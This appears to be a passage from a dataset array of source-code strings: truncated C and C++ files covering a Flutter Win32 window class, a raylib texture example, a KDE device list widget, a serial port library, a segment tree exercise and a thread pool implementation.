(enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/*******************************************************************************************\n*\n*   raylib [textures] example - Retrieve image data from texture: LoadImageFromTexture()\n*\n*   NOTE: Images are loaded in CPU memory (RAM); textures are loaded in GPU memory (VRAM)\n*\n*   Example originally created with raylib 1.3, last time updated with raylib 4.0\n*\n*   Example licensed under an unmodified zlib/libpng license, which is an OSI-certified,\n*   BSD-like license that allows static linking with closed source software\n*\n*   Copyright (c) 2015-2024 Ramon Santamaria (@raysan5)\n*\n********************************************************************************************/\n\n#include \"raylib.h\"\n\n//------------------------------------------------------------------------------------\n// Program main entry point\n//------------------------------------------------------------------------------------\nint main(void)\n{\n    // Initialization\n    //--------------------------------------------------------------------------------------\n    const int screenWidth = 800;\n    const int screenHeight = 450;\n\n    InitWindow(screenWidth, screenHeight, \"raylib [textures] example - texture to image\");\n\n    // NOTE: Textures MUST be loaded after Window initialization (OpenGL context is required)\n\n    Image image = LoadImage(\"assets/raylib_logo.png\");  // Load image data into CPU memory (RAM)\n    Texture2D texture = LoadTextureFromImage(image);       // Image converted to texture, GPU memory (RAM -> VRAM)\n    UnloadImage(image);                                    // Unload image data from CPU memory (RAM)\n\n\n    image = LoadImageFromTexture(texture);                 // Load image from GPU texture (VRAM -> RAM)\n    UnloadTexture(texture);                                // Unload texture from GPU memory (VRAM)\n\n    texture = LoadTextureFromImage(image);                 // Recreate texture from retrieved image data (RAM -> VRAM)\n    UnloadImage(image);                                    // Unload retrieved image data from CPU memory (RAM)\n    //---------------------------------------------------------------------------------------\n\n    // Main game loop\n    while (!WindowShouldClose())    // Detect window close button or ESC key\n    {\n        // Update\n        //----------------------------------------------------------------------------------\n        // TODO: Update your variables here\n        //----------------------------------------------------------------------------------\n\n        // Draw\n        //----------------------------------------------------------------------------------\n        BeginDrawing();\n\n            ClearBackground(RAYWHITE);\n\n            DrawTexture(texture, screenWidth/2 - texture.width/2, screenHeight/2 - texture.height/2, WHITE);\n\n            DrawText(\"this IS a texture loaded from an image!\", 300, 370, 10, GRAY);\n\n        EndDrawing();\n        //----------------------------------------------------------------------------------\n    }\n\n    // De-Initialization\n    //--------------------------------------------------------------------------------------\n    UnloadTexture(texture);       // Texture unloading\n\n    CloseWindow();                // Close window and OpenGL context\n    //--------------------------------------------------------------------------------------\n\n    return 0;\n}",
    "/****************************************************************************\n *                                                                          *\n *   This file is part of KDE CDEmu Manager.                                *\n *                                                                          *\n *   Copyright (C) 2009-2024 by Marcel Hasler <mahasler@gmail.com>          *\n *                                                                          *\n *   This program is free software; you can redistribute it and/or modify   *\n *   it under the terms of the GNU General Public License as published by   *\n *   the Free Software Foundation, either version 3 of the License, or      *\n *   (at your option) any later version.                                    *\n *                                                                          *\n *   This program is distributed in the hope that it will be useful,        *\n *   but WITHOUT ANY WARRANTY; without even the implied warranty of         *\n *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the           *\n *   GNU General Public License for more details.                           *\n *                                                                          *\n *   You should have received a copy of the GNU General Public License      *\n *   along with this program. If not, see <http://www.gnu.org/licenses/>.   *\n *                                                                          *\n ****************************************************************************/\n\n#include \"devicelistitem.h\"\n\n#include <KLocalizedString>\n\n#include <QHBoxLayout>\n\nDeviceListItem::DeviceListItem(int index)\n    : m_index(index),\n      m_widget(new QWidget),\n      m_label(new QLabel),\n      m_button(new QPushButton)\n{\n    setFlags(Qt::NoItemFlags);\n\n    m_button->setFixedWidth(30);\n    m_button->setFlat(true);\n\n    connect(m_button, SIGNAL(clicked()), this, SLOT(onButtonClicked()));\n\n    auto layout = new QHBoxLayout(m_widget);\n    layout->addWidget(m_label);\n    layout->addWidget(m_button);\n    layout->setContentsMargins(0, 0, 0, 0);\n    m_widget->setLayout(layout);\n}\n\n// ---------------------------------------------------------------------------------------------- //\n\nvoid DeviceListItem::setFileName(const QString& name)\n{\n    m_label->setText(name);\n\n    if (name.isEmpty())\n    {\n        m_button->setIcon(QIcon::fromTheme(\"document-open\"));\n        m_button->setToolTip(i18n(\"Select image file\"));\n    }\n    else\n    {\n        m_button->setIcon(QIcon::fromTheme(\"media-eject\"));\n        m_button->setToolTip(i18n(\"Unmount current image\"));\n\n    }\n}\n\n// ---------------------------------------------------------------------------------------------- //\n\nauto DeviceListItem::fileName() const -> QString\n{\n    return m_label->text();\n}\n\n// ---------------------------------------------------------------------------------------------- //\n\nauto DeviceListItem::widget() const -> QWidget*\n{\n    return m_widget;\n}\n\n// ---------------------------------------------------------------------------------------------- //\n\nvoid DeviceListItem::onButtonClicked()\n{\n    if (m_label->text().isEmpty())\n        emit mountClicked(m_index);\n    else\n        emit unmountClicked(m_index);\n}\n\n// ---------------------------------------------------------------------------------------------- //\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <algorithm>\n\n#if !defined(_WIN32) && !defined(__OpenBSD__) && !defined(__FreeBSD__)\n# include <alloca.h>\n#endif\n\n#if defined (__MINGW32__)\n# define alloca __builtin_alloca\n#endif\n\n#include \"serial.h\"\n#include \"common.h\"\n\nnamespace serial {\n\nusing std::min;\nusing std::numeric_limits;\nusing std::vector;\nusing std::size_t;\nusing std::string;\n\nusing serial::Serial;\nusing serial::bytesize_t;\nusing serial::parity_t;\nusing serial::stopbits_t;\nusing serial::flowcontrol_t;\n\nclass Serial::ScopedReadLock {\n public:\n  explicit ScopedReadLock(Serial::SerialImpl *pimpl) : pimpl_(pimpl) {\n    this->pimpl_->readLock();\n  }\n  ~ScopedReadLock() {\n    this->pimpl_->readUnlock();\n  }\n private:\n  // Disable copy constructors\n  ScopedReadLock(const ScopedReadLock &);\n  const ScopedReadLock &operator=(ScopedReadLock);\n\n  Serial::SerialImpl *pimpl_;\n};\n\nclass Serial::ScopedWriteLock {\n public:\n  explicit ScopedWriteLock(Serial::SerialImpl *pimpl) : pimpl_(pimpl) {\n    this->pimpl_->writeLock();\n  }\n  ~ScopedWriteLock() {\n    this->pimpl_->writeUnlock();\n  }\n private:\n  // Disable copy constructors\n  ScopedWriteLock(const ScopedWriteLock &);\n  const ScopedWriteLock &operator=(ScopedWriteLock);\n  Serial::SerialImpl *pimpl_;\n};\n\nSerial::Serial(const string &port, uint32_t baudrate, serial::Timeout timeout,\n               bytesize_t bytesize, parity_t parity, stopbits_t stopbits,\n               flowcontrol_t flowcontrol)\n  : pimpl_(new SerialImpl(port, baudrate, bytesize, parity,\n                          stopbits, flowcontrol)) {\n  pimpl_->setTimeout(timeout);\n}\n\nSerial::~Serial() {\n  delete pimpl_;\n}\n\nbool Serial::open() {\n  return pimpl_->open();\n}\n\nvoid Serial::closePort() {\n  pimpl_->close();\n}\n\nbool Serial::isOpen() {\n  return pimpl_->isOpen();\n}\n\nsize_t Serial::available() {\n  return pimpl_->available();\n}\n\nbool Serial::waitReadable() {\n  serial::Timeout timeout(pimpl_->getTimeout());\n  return pimpl_->waitReadable(timeout.read_timeout_constant);\n}\n\nvoid Serial::waitByteTimes(size_t count) {\n  pimpl_->waitByteTimes(count);\n}\n\nint Serial::waitfordata(size_t data_count, uint32_t timeout,\n                        size_t *returned_size) {\n  return pimpl_->waitfordata(data_count, timeout, returned_size);\n}\n\nsize_t Serial::writeData(const uint8_t *data, size_t size) {\n  return write(data, size);\n}\n\nsize_t Serial::readData(uint8_t *data, size_t size) {\n  return read(data, size);\n}\n\nsize_t Serial::read_(uint8_t *buffer, size_t size) {\n  return this->pimpl_->read(buffer, size);\n}\n\nsize_t Serial::read(uint8_t *buffer, size_t size) {\n  ScopedReadLock lock(this->pimpl_);\n  return this->pimpl_->read(buffer, size);\n}\n\nsize_t Serial::read(std::vector<uint8_t> &buffer, size_t size) {\n  ScopedReadLock lock(this->pimpl_);\n  uint8_t *buffer_ = static_cast<uint8_t *>(alloca(size * sizeof(uint8_t)));\n  size_t bytes_read = this->pimpl_->read(buffer_, size);\n  buffer.insert(buffer.end(), buffer_, buffer_ + bytes_read);\n  return bytes_read;\n}\n\nsize_t Serial::read(std::string &buffer, size_t size) {\n  ScopedReadLock lock(this->pimpl_);\n  uint8_t *buffer_ = static_cast<uint8_t *>(alloca(size * sizeof(uint8_t)));\n  size_t bytes_read = this->pimpl_->read(buffer_, size);\n  buffer.append(reinterpret_cast<const char *>(buffer_), bytes_read);\n  return bytes_read;\n}\n\nstring Serial::read(size_t size) {\n  std::string buffer;\n  this->read(buffer, size);\n  return buffer;\n}\n\nsize_t Serial::readline(string &buffer, size_t size, string eol) {\n  ScopedReadLock lock(this->pimpl_);\n  size_t eol_len = eol.length();\n  uint8_t *buffer_ = static_cast<uint8_t *>(alloca(size * sizeof(uint8_t)));\n  size_t read_so_far = 0;\n\n  while (true) {\n    size_t bytes_read = this->read_(buffer_ + read_so_far, 1);\n    read_so_far += bytes_read;\n\n    if (bytes_read == 0) {\n      break; // Timeout occured on reading 1 byte\n    }\n\n    if (string(reinterpret_cast<const char *>(buffer_ + read_so_far - eol_len),\n               eol_len) == eol) {\n      break; // EOL found\n    }\n\n    if (read_so_far == size) {\n      break; // Reached the maximum read length\n    }\n  }\n\n  buffer.append(reinterpret_cast<const char *>(buffer_), read_so_far);\n  return read_so_far;\n}\n\nstring Serial::readline(size_t size, string eol) {\n  std::string buffer;\n  this->readline(buffer, size, eol);\n  return buffer;\n}\n\nvector<string> Serial::readlines(size_t size, string eol) {\n  ScopedReadLock lock(this->pimpl_);\n  std::vector<std::string> lines;\n  size_t eol_len = eol.length();\n  uint8_t *buffer_ = static_cast<uint8_t *>(alloca(size * sizeof(uint8_t)));\n  size_t read_so_far = 0;\n  size_t start_of_line = 0;\n\n  while (read_so_far < size) {\n    size_t bytes_read = this->read_(buffer_ + read_so_far, 1);\n    read_so_far += bytes_read;\n\n    if (bytes_read == 0) {\n      if (start_of_line != read_so_far) {\n        lines.push_back(string(reinterpret_cast<const char *>(buffer_ + start_of_line),\n                               read_so_far - start_of_line));\n      }\n\n      break; // Timeout occured on reading 1 byte\n    }\n\n    if ",
    "#include <bits/stdc++.h>\n#include \"utils.h\"\n\nusing namespace std;\n\nclass SegmentTree\n{\npublic:\n    vector<int> m_tree;\n    int m_n;\n\n    SegmentTree(vector<int> x)\n    {\n        int n = x.size();\n        m_n = n;\n        m_tree.resize(2 * n);\n\n        for (int i = 0; i < n; i++)\n        {\n            m_tree[n + i] = x[i];\n        }\n\n        for (int i = n - 1; i > 0; i--)\n        {\n            m_tree[i] = m_tree[i * 2] + m_tree[i * 2 + 1];\n            ;\n        }\n\n        m_tree[0] = -1;\n    }\n\n    int sum(int a, int b)\n    {\n        int n = m_tree.size() / 2;\n        a += n;\n        b += n;\n        int s = 0;\n        while (a <= b)\n        {\n            if (a % 2 == 1)\n                s += m_tree[a++];\n            if (b % 2 == 0)\n                s += m_tree[b--];\n            a /= 2;\n            b /= 2;\n        }\n        return s;\n    }\n\n    void add(int i, int x)\n    {\n        int a = i + m_n;\n        while (a > 0)\n        {\n            m_tree[a] += x;\n            a /= 2;\n        }\n    }\n\n    void print()\n    {\n        for (int i = 0; i < m_tree.size(); i++)\n        {\n            cout << m_tree[i] << ' ';\n        }\n        cout << '\\n';\n    }\n};\n\nint main()\n{\n\n    SegmentTree s = SegmentTree(vector<int>{5, 8, 6, 3, 2, 7, 2, 6});\n\n    cout << s.sum(0, 5) << '\\n';\n\n    s.print();\n\n    s.add(2, 2);\n\n    s.print();\n\n    cout << add(1, 2) << '\\n';\n}\n\n/*\ntrace for sum(0,1)\n\n\n*/",
    "#include\"threadpool.h\"\n#include<functional>\n#include<thread>\n#include<iostream>\n#include<memory>\n#include<mutex>\n\nconst int TASK_MAX_THRESHOLD = 1024;//INT32_MAX\nconst int THREAD_MAX_SIZE = 10;//200\nconst int THREAD_MAX_IDLE_TIME = 10;//\u5355\u4f4d\uff1a\u79d2//60\n\n//\u7ebf\u7a0b\u6c60\u6784\u9020\u51fd\u6570\nThreadPool::ThreadPool()\n\t:initThreadSize_(0)\n\t,threadSizeThreshold_(THREAD_MAX_SIZE)\n\t,idleThreadSize_(0)\n\t, curThreadSize_(0)\n\t,taskSize_(0)\n\t,taskQueMaxThreshold_(TASK_MAX_THRESHOLD)\n\t, poolMode_(PoolMode::MODE_FIXED)\n\t, isPoolRunning_(false)\n{}\n\n//\u7ebf\u7a0b\u6c60\u6790\u6784\u51fd\u6570\u51fd\u6570\nThreadPool::~ThreadPool()\n{\n\tisPoolRunning_ = false;\n\t//notEmpty_.notify_all();\n\t//test\n\tstd::cout << \"**********\" << curThreadSize_ << \" \" << threads_.size() << \"**********\" << std::endl;\n\t//\u7b49\u5f85\u6240\u6709\u7ebf\u7a0b\u7ed3\u675f\u8fd4\u56de(\u4e24\u79cd\u72b6\u6001\uff1a1.\u6b63\u5728\u6267\u884c\uff0c2.\u963b\u585e)\n\tstd::unique_lock<std::mutex> lock(taskQueMtx_);\n\t\n\tnotEmpty_.notify_all();\n\t\n\t/*exitCond_.wait(lock, [&]()->bool {return curThreadSize_ == 0; });  //\u4f7f\u7528curThreadSize_\u8fdb\u884c\u5224\u65ad\u7684\u524d\u63d0\u662f\u8981\u786e\u4fdd\u5176\u6b63\u786e\u6027*/\n\texitCond_.wait(lock, [&]()->bool {return threads_.size() == 0; });\n}\n\n//\u8bbe\u7f6e\u7ebf\u7a0b\u6c60\u6a21\u5f0f\nvoid ThreadPool::setMode(PoolMode mode)\n{\n\tif (checkRunningState())\n\t\treturn;\n\tpoolMode_ = mode;\n}\n\n\n//\u8bbe\u7f6eTask\u4efb\u52a1\u961f\u5217\u6570\u91cf\nvoid ThreadPool::set_taskQueMaxThreshold(int threshold)\n{\n\tif (checkRunningState())\n\t\treturn;\n\t//\u8bb0\u5f55\u521d\u59cb\u7ebf\u7a0b\u4e2a\u6570\n\ttaskQueMaxThreshold_ = threshold;\n\t\n}\n//\u8bbe\u7f6e\u7ebf\u7a0b\u6c60Cache\u6a21\u5f0f\u4e0b\u6700\u5927\u7ebf\u7a0b\u6570\u91cf\nvoid ThreadPool::setThreadSizeThreshold(int threshold)\n{\n\tif (checkRunningState())\n\t\treturn;\n\tif (poolMode_ == PoolMode::MODE_CACHED)\n\t{\n\t\tthreadSizeThreshold_ = threshold;\n\t}\n}\n\n//void submitTask(std::shared_ptr<Task> sp);\n//\u7ed9\u7ebf\u7a0b\u6c60\u63d0\u4ea4\u4efb\u52a1\uff1a\u7528\u6237\u8c03\u7528\u8be5\u63a5\u53e3\uff0c\u4f20\u5165\u4efb\u52a1\u5bf9\u8c61\uff0c\u751f\u4ea7\u4efb\u52a1\nResult ThreadPool::submitTask(std::shared_ptr<Task> sp)\n{\n\t//\u83b7\u53d6\u9501\n\tstd::unique_lock<std::mutex> lock(taskQueMtx_);\n\t\n\t//\u7ebf\u7a0b\u7684\u901a\u4fe1\uff0c\u7b49\u5f85\u4efb\u52a1\u961f\u5217\u6709\u7a7a\u4f59\n\t//while (taskQue_.size() == taskQueMaxThreshold_) {\n\t//\tnotFull_.wait(lock);//\u5f53\u524d\u72b6\u6001\u8fdb\u5165\u7b49\u5f85\uff0c\u6b64\u65f6\u9700\u8981notify(),\u4e14\u9700\u8981\u62ff\u5230mutex\u624d\u53ef\u4ee5\u6062\u590d\n\t//}\u4e0e\u4e0b\u5f0f\u540c\u4e49\n\t\n\t//\u7528\u6237\u63d0\u4ea4\u4efb\u52a1\uff0c\u6700\u957f\u4e0d\u80fd\u963b\u585e\u8d85\u8fc71s,\u5426\u5219\u5224\u65ad\u63d0\u4ea4\u4efb\u52a1\u5931\u8d25\n\tif (!notFull_.wait_for(lock, std::chrono::seconds(1)\n\t\t, [&]()->bool {return taskQue_.size() < (size_t)taskQueMaxThreshold_; })) \n\t{\n\t\t//\u8868\u793a\u7b49\u5f85\u4e00\u79d2\u949f\u6761\u4ef6\u4f9d\u7136\u672a\u5b8c\u6210\uff0c\n\t\tstd::cerr << \"Task queue is full, submit task fail!\" << std::endl;\n\t\t/*\n\t\t* \u4e24\u79cd\u8fd4\u56de\u65b9\u5f0f\n\t\t* 1.return task->getResult()\n\t\t* 2.return Result(task)\n\t\t\u7b2c\u4e00\u79cd\u4e0d\u53ef\u884c\u7684\u539f\u56e0\uff0c\u662f\u4efb\u52a1task\u5b8c\u6210\u540e\uff0ctask\u5bf9\u8c61\u5c31\u88ab\u6790\u6784\u4e86\uff0c\u5219\u6b64\u65f6\u7528Result\u63a5\u6536\uff0c\u4e5f\u4f1a\u88ab\u6790\u6784\uff0c\u6240\u4ee5\u4e0d\u53ef\u884c\n\t\t*/\n\t\treturn Result(sp, false);\n\t}\n\t//\u5982\u679c\u6709\u7a7a\u4f59\uff0c\u628a\u4efb\u52a1\u653e\u5165\u4efb\u52a1\u961f\u5217\u4e2d\n\ttaskQue_.emplace(sp);\n\ttaskSize_++;\n\t//\u65b0\u653e\u4e86\u4efb\u52a1\uff0c\u4efb\u52a1\u961f\u5217\u4e0d\u7a7a\u4e86\uff0c\u6b64\u65f6\u518dnotEmpty_\u8fdb\u884c\u901a\u77e5\n\tnotEmpty_.notify_all();\n\n\t//Cache\u6a21\u5f0f\uff08\u573a\u666f\uff1a\u4efb\u52a1\u5904\u7406\u6bd4\u8f83\u7d27\u6025\uff0c\u5c0f\u800c\u5feb\u7684\u4efb\u52a1\uff09\u9700\u8981\u6839\u636e\u4efb\u52a1\u6570\u91cf\u548c\u7a7a\u95f2\u7ebf\u7a0b\u7684\u6570\u91cf\uff0c\u5224\u65ad\u662f\u5426\u9700\u8981\u521b\u5efa\u65b0\u7684\u7ebf\u7a0b\n\tif (poolMode_ == PoolMode::MODE_CACHED\n\t\t&& taskSize_ > idleThreadSize_\n\t\t&& curThreadSize_ < threadSizeThreshold_) \n\t{\n\t\tstd::cout << \"new thread\" << std::this_thread::get_id() << \"<<<<<<<<<<\" << std::endl;\n\t\t//\u521b\u5efa\u65b0\u7ebf\u7a0b\n\t\tauto ptr = new Thread(std::bind(&ThreadPool::threadFunc, this, std::placeholders::_1));\n\t\t//threads_.emplace_back(std::move(ptr));//\u4e0e push_back() \u51fd\u6570\u7c7b\u4f3c\uff0c\u4f46\u662f emplace_back() \u53ef\u4ee5\u63a5\u53d7\u4efb\u610f\u6570\u91cf\u7684\u53c2\u6570\uff0c\u5e76\u5c06\u5b83\u4eec\u4f20\u9012\u7ed9\u5143\u7d20\u7c7b\u578b\u7684\u6784\u9020\u51fd\u6570\uff0c\u4ece\u800c\u5728\u539f\u5730\u6784\u9020\u5143\u7d20\uff0c\u800c\u4e0d\u9700\u8981\u989d\u5916\u7684\u62f7\u8d1d\u6216\u79fb\u52a8\u64cd\u4f5c\u3002\n\t\tint tId = ptr->getThreadId();\n\t\tthreads_.emplace(tId, std::move(ptr));\n\t\tthreads_[tId]->start();//\u542f\u52a8\u7ebf\u7a0b\n\t\t//\u4fee\u6539\u7ebf\u7a0b\u76f8\u5173\u53d8\u91cf\n\t\tidleThreadSize_++;\n\t\tcurThreadSize_++;\n\t}\n\t//\u8fd4\u56de\u4efb\u52a1\u7684Result\u5bf9\u8c61\n\treturn Result(sp);\n}\n\n\n//\u5f00\u542f\u7ebf\u7a0b\u6c60\uff1b\nvoid ThreadPool::start(int initThreadSize)\n{\n\t//\u8bbe\u7f6e\u7ebf\u7a0b\u6c60\u7684\u542f\u52a8\u72b6\u6001\n\tisPoolRunning_ = true;\n\tinitThreadSize_ = initThreadSize;\n\tcurThreadSize_ = initThreadSize;\n\t//\u521b\u5efa\u7ebf\u7a0b\u5bf9\u8c61\n\tfor (int i = 0; i < initThreadSize_; i++) {\n\t\t//\u521b\u5efathread\u7ebf\u7a0b\u5bf9\u8c61\u7684\u65f6\u5019\u628a\u7ebf\u7a0b\u51fd\u6570\u7ed9\u5230thread\u7ebf\u7a0b\u5bf9\u8c61\n\t\t//\u628a\u7ebf\u7a0b\u51fd\u6570\u7ed1\u5b9a\u5230Thread\u5bf9\u8c61\uff0c\u7136\u540e\u62ff\u5230ThreadPool\u7684\u5bf9\u8c61\u6307\u9488this\n\t\tauto ptr = new Thread(std::bind(&ThreadPool::threadFunc, this,std::placeholders::_1));\n\t\t//threads_.emplace_back(std::move(ptr));//\u4e0e push_back() \u51fd\u6570\u7c7b\u4f3c\uff0c\u4f46\u662f emplace_back() \u53ef\u4ee5\u63a5\u53d7\u4efb\u610f\u6570\u91cf\u7684\u53c2\u6570\uff0c\u5e76\u5c06\u5b83\u4eec\u4f20\u9012\u7ed9\u5143\u7d20\u7c7b\u578b\u7684\u6784\u9020\u51fd\u6570\uff0c\u4ece\u800c\u5728\u539f\u5730\u6784\u9020\u5143\u7d20\uff0c\u800c\u4e0d\u9700\u8981\u989d\u5916\u7684\u62f7\u8d1d\u6216\u79fb\u52a8\u64cd\u4f5c\u3002\n\t\tint threadId = ptr->getThreadId();\n\t\tthreads_.emplace(threadId, std::move(ptr));\n\t}\n\t//\u542f\u52a8\u6240\u6709\u7ebf\u7a0b std::vector<Thread*> thread_\n\tfor (int i = 0; i < initThreadSize_; i++) {\n\t\tthreads_[i]->start();//\u9700\u8981\u53bb\u6267\u884c\u4e00\u4e2a\u7ebf\u7a0b\u51fd\u6570\n\t\tidleThreadSize_++;//\u8bb0\u5f55\u521d\u59cb\u7a7a\u95f2\u7ebf\u7a0b\u6570\u91cf\n\t}\n}\n//\u5b9a\u4e49\u7ebf\u7a0b\u51fd\u6570\nvoid ThreadPool::threadFunc(int threadid)\n{\n\tauto lastDoTime = std::chrono::high_resolution_clock().now();\n\tfor (;;)//while (isPoolRunning_)\n\t{\n\t\tstd::shared_ptr<Task> task;//\u9ed8\u8ba4\u667a\u80fd\u6307\u9488\u521d\u59cb\u5316\u4e3a\u7a7a\n\t\t//\u521b\u5efa\u4e00\u4e2a\u5c40\u90e8\u4f5c\u7528\u57df\uff0c\u5728\u62ff\u8d70\u4efb\u52a1\u540e\u5c31\u628a\u9501\u91ca\u653e\u6389\uff08\u81ea\u52a8\u6790\u6784\uff09\n\t\t{\n\t\t\tstd::cout << \"\u5c1d\u8bd5\u83b7\u53d6\u4efb\u52a1\uff01\" << \"tid\uff1a\" << std::this_thread::get_id() << std::endl;\n\t\t\t//\u5148\u83b7\u53d6\u9501\n\t\t\tstd::unique_lock<std::mutex> lock(taskQueMtx_);\n\t\t\t//cache\u6a21\u5f0f\u4e0b,\u53ef\u80fd\u521b\u5efa\u4e86\u5f88\u591a\u7ebf\u7a0b\uff0c\u4f46\u662f\u7a7a\u95f2\u65f6\u95f4\u8d85\u8fc760s\uff0c\u5e94\u8be5\u628a\u591a\u4f59\u7684\u7ebf\u7a0b\u7ed3\u675f\u56de\u6536\uff1f\n\t\t\t\t//\u7ed3\u675f\u524d\u56de\u6536\uff08\u8d85\u8fc7initThreadSize_\u6570\u91cf\u7684\u7ebf\u7a0b\u8981\u56de\u6536\u6389\uff09\n\t\t\t\t//\u5f53\u524d\u65f6\u95f4-\u4e0a\u4e00\u6b21\u7ebf\u7a0b\u6267\u884c\u65f6\u95f4 > 60S\n\t\t\t//\u9501+\u53cc\u91cd\u5224\u65ad\n\t\t\twhile (taskQue_.size() == 0)  \n\t\t\t{\n\t\t\t\t////\u7ebf\u7a0b\u6c60\u8981\u7ed3\u675f\uff0c\u56de\u6536\u7ebf\u7a0b\u8d44\u6e90\n\t\t\t\tif (!isPoolRunning_) {\n\t\t\t\t\t//threadid==>thread\u5bf9\u8c61==>\u5220\u9664\n\t\t\t\t\tthreads_.erase(threadid);\n\t\t\t\t\tcurThreadSize_--;//\u6b64\u65f6\u7ed3\u675f\u5faa\u73af\uff0c\u4e0d\u9700\u8981\u7ef4\u62a4\u6b63\u786e\u6027\n\t\t\t\t\tidleThreadSize_--;\n\t\t\t\t\texitCond_.notify_all();\n\t\t\t\t\tstd::cout << \"thread\" << std::this_thread::get_id() << \"\u64a4\u9500!\" << std::endl;\n\t\t\t\t\treturn;\n\t\t\t\t}\n\n\t\t\t\tif (poolMode_ == PoolMode::MODE_CACHED)\n\t\t\t\t{\n\t\t\t\t\t//\u6bcf\u4e00\u79d2\u949f\u8fd4\u56de\u4e00\u6b21\uff0c\u600e\u4e48\u533a\u5206\u8d85\u65f6\u8fd4\u56de\u8fd8\u662f\u6709\u4efb\u52a1\u5f85\u8fd4\u56de\n\t\t\t\t\t\t//\u6761\u4ef6\u53d8\u91cf\uff0c\u8d85\u65f6\u8fd4\u56de\u4e86\n\t\t\t\t\tif (std::cv_status::timeout == notEmpty_.wait_for(lock, std::chrono::seconds(1)))\n\t\t\t\t\t{\n\t\t\t\t\t\tauto now = std::chrono::high_resolution_clock().now();\n\t\t\t\t\t\tauto dur = std::chrono::duration_cast<std::chrono::seconds>(now - ",
